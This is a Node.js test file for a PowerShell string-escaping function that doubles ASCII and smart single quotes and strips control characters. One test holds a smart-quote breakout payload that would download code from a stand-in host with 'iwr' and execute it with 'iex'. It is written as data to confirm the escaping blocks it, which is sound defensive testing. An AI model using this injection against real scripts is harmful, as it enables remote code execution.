import { test } from 'node:test';
import assert from 'node:assert/strict';
import { psq } from '../src/ps.js';

test('should double ASCII and all four smart single quotes so none can close a literal', () => {
  for (const q of ["'", '\u2018', '\u2019', '\u201A', '\u201B']) {
    assert.equal(psq(`a${q}b`), `a${q}${q}b`);
  }
});

test('should neutralise the classic smart-quote breakout payload', () => {
  const out = psq("x\u2019;iwr evil|iex;\u2019");
  assert.ok(!/(?<!\u2019)\u2019(?!\u2019)/.test(out), 'every smart quote must be doubled');
});

test('should strip control characters but keep tabs and newlines', () => {
  assert.equal(psq('a\u0000b\u0007c\td\ne'), 'abc\td\ne');
});

test('should tolerate null and numbers', () => {
  assert.equal(psq(null), '');
  assert.equal(psq(42), '42');
});